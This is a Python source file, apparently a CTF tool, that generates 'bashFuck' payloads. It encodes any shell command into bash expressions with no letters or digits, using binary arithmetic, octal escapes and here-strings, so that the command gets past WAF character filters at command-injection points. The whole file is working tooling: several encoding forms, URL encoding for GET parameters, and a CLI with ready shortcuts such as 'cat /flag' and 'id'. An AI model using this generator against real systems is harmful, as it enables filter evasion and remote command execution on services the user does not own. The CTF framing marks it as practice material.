# -*- coding: utf-8 -*-
"""
bashFuck — Bash 无字母命令执行 payload 生成器
===============================================

CTF 常见考点：过滤字母数字后用 $((2#binary)) 二进制替换 +
ANSI-C $'\\ooo' 八进制转义 + here-string 链式执行来绕过 WAF。

核心原理：
    1. $((2#binary)) 将二进制转为十进制（用于构造任意数字）
    2. $'\\ooo' ANSI-C 引号将八进制转为 ASCII 字符
    3. $0<<<... here-string 链式执行命令

支持 payload 形式（来源于 ProbiusOfficial/bashFuck）：
    - bit:   使用 0 1 字符集（最常用）
    - zero:  使用 ${##} 替换 1，消去数字 1
    - c:     使用 ${##}/${#} 替换 1/0，完全消去数字

参考：https://github.com/ProbiusOfficial/bashFuck
"""

from __future__ import annotations
from typing import Dict, Optional
import urllib.parse


def get_oct(c: str) -> str:
    """返回字符的八进制 ASCII 字符串（不含 0o 前缀）。"""
    return oct(ord(c))[2:]


def encode_char_bit(c: str) -> str:
    """bashFuck 'bit' 形式编码单个字符。
    
    返回格式：\\$(($((1<<1))#binary))
    
    >>> '\\' in encode_char_bit('l')
    True
    """
    octal_str = get_oct(c)
    decimal_val = int(octal_str)  # 八进制数字按十进制解释
    binary = bin(decimal_val)[2:]  # 去 0b 前缀
    return f'\\\\$(($((1<<1))#{binary}))'


def encode_char_zero(c: str) -> str:
    """bashFuck 'zero' 形式：用 ${##} 替换所有 1。
    
    ${##} 展开为 1（# 的长度），从而消去数字 1。
    """
    return encode_char_bit(c).replace('1', '${##}')


def encode_char_c(c: str) -> str:
    """bashFuck 'c' 形式：用 ${##}/${#} 替换所有 1/0。
    
    ${#} 展开为 0（空字符串的长度），完全消去数字。
    """
    return encode_char_bit(c).replace('1', '${##}').replace('0', '${#}')


def bashfuck_payload(cmd: str, form: str = 'bit') -> str:
    """生成 bashFuck payload。

    Args:
        cmd: 要执行的 shell 命令，如 'cat /flag'
        form: payload 形式，可选 'bit' | 'zero' | 'c'

    Returns:
        可直接用于 system($cmd) 的 payload 字符串

    Raises:
        ValueError: 不支持的形式

    Examples:
        >>> p = bashfuck_payload('ls')
        >>> '$0<<<$0' in p
        True

        >>> p = bashfuck_payload('cat /flag', form='c')
        >>> '${!#}' in p
        True
    """
    if form not in ('bit', 'zero', 'c'):
        raise ValueError(f"Unsupported form: {form}. Use 'bit', 'zero', or 'c'.")

    # 编码每个字符
    if form == 'bit':
        encoder = encode_char_bit
    elif form == 'zero':
        encoder = encode_char_zero
    else:
        encoder = encode_char_c

    bash_str = ''.join(encoder(c) for c in cmd)

    # 构建完整 payload（格式与 bashFuck.py 完全一致）
    if form in ('bit', 'zero'):
        # $0<<<$0\<\<\<\$\'\\$((...))\\$((...))\\...\'
        prefix = r"$0<<<$0\<\<\<\$\'"
        suffix = r"\'"
    else:
        # ${!#}<<<${!#}\<\<\<\$\'\\$((...))\\...\'
        prefix = r"${!#}<<<${!#}\<\<\<\$\'"
        suffix = r"\'"

    return prefix + bash_str + suffix


def bashfuck_heredoc(cmd: str, form: str = 'bit') -> str:
    """生成使用 here-document (<<) 替代 here-string (<<<) 的 payload。

    当目标 shell 是 dash (POSIX sh) 而非 bash 时，<<< 不可用，
    但 << 可用。注意 here-doc 需要 unquoted delimiter 才能展开变量。

    Args:
        cmd: 要执行的命令
        form: 编码形式，支持 'bit' | 'zero' | 'c'

    Returns:
        包含换行的 here-doc payload
    """
    if form not in ('bit', 'zero', 'c'):
        raise ValueError(f"Unsupported form: {form}")

    if form == 'bit':
        encoder = encode_char_bit
    elif form == 'zero':
        encoder = encode_char_zero
    else:
        encoder = encode_char_c

    bash_str = ''.join(encoder(c) for c in cmd)

    # Here-doc 格式：$0<<_\n$0\<\<\<\$\'\\$((...))\\...\'\n_
    # delimiter _ 不引号以允许变量展开
    inner = f"$0\\<\\<\\<\\$\\'" + bash_str + f"\\'"
    return f"$0<<_\n{inner}\n_"


def bashfuck_y(cmd: str) -> str:
    """bashFuck 'y' 形式：用 ~ 位运算构造数字 0-7 替代二进制。
    
    仅使用：! $ & ' ( ) < = \ _ { } ~ 字符（无数字 0-1）。
    
    注意：此形式包含 = 字符，某些 WAF 可能过滤。
    """
    # 数字 0-7 的纯位运算构造
    oct_digits = [
        '$(())',                                                         # 0
        '$((~$(($((~$(())))$((~$(())))))))',                            # 1
        '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',                 # 2
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',      # 3
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
    ]

    payload = '__=$(())&&${!__}<<<${!__}\\<\\<\\<\\$\\\\\''
    for c in cmd:
        for d in get_oct(c):
            payload += '\\\\' + oct_digits[int(d)]
    payload += '\\\\\''
    return payload


def generate_all_forms(cmd: str) -> Dict[str, str]:
    """生成所有形式的 bashFuck payload。

    Returns:
        dict with keys: bit, zero, c, heredoc_bit, y
    """
    return {
        'bit': bashfuck_payload(cmd, 'bit'),
        'zero': bashfuck_payload(cmd, 'zero'),
        'c': bashfuck_payload(cmd, 'c'),
        'heredoc_bit': bashfuck_heredoc(cmd, 'bit'),
        'y': bashfuck_y(cmd),
    }


def url_encode_payload(payload: str) -> str:
    """URL 编码 payload（用于 GET 参数传递）。"""
    return urllib.parse.quote(payload)


# ─── 便捷接口 ───────────────────────────────────────────

def quick_ls() -> str:
    """快速返回 'ls' 命令的 payload。"""
    return bashfuck_payload('ls')


def quick_cat_flag() -> str:
    """快速返回 'cat /flag' 命令的 payload（CTF 最常用）。"""
    return bashfuck_payload('cat /flag')


def quick_id() -> str:
    """快速返回 'id' 命令的 payload。"""
    return bashfuck_payload('id')


# ─── CLI ────────────────────────────────────────────────

if __name__ == '__main__':
    import sys
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

    if len(sys.argv) < 2:
        print("bashFuck — Bash 无字母命令执行 Payload 生成器")
        print()
        print("用法: python bashfuck.py <command> [--form=bit|zero|c|heredoc|y] [--all]")
        print()
        print("示例:")
        print("  python bashfuck.py ls             # 生成 bit 形式 payload")
        print("  python bashfuck.py 'cat /flag'    # 读 flag（最常用）")
        print("  python bashfuck.py id --all       # 生成所有形式")
        print("  python bashfuck.py ls --form=c    # 纯变量形式（无数字）")
        print()
        print("预置快捷命令:")
        print("  quick:ls, quick:cat_flag, quick:id")
        sys.exit(0)

    cmd = sys.argv[1]

    # 处理快捷命令
    shortcuts = {
        'quick:ls': quick_ls,
        'quick:cat_flag': quick_cat_flag,
        'quick:id': quick_id,
    }
    if cmd in shortcuts:
        print(shortcuts[cmd]())
        sys.exit(0)

    # 解析选项
    form = 'bit'
    show_all = False
    for arg in sys.argv[2:]:
        if arg == '--all':
            show_all = True
        elif arg.startswith('--form='):
            form = arg.split('=', 1)[1]

    if show_all:
        results = generate_all_forms(cmd)
        for name, payload in results.items():
            print(f"\n=== {name} (len={len(payload)}) ===")
            print(payload)
    else:
        if form == 'heredoc':
            print(bashfuck_heredoc(cmd, 'bit'))
        else:
            print(bashfuck_payload(cmd, form))
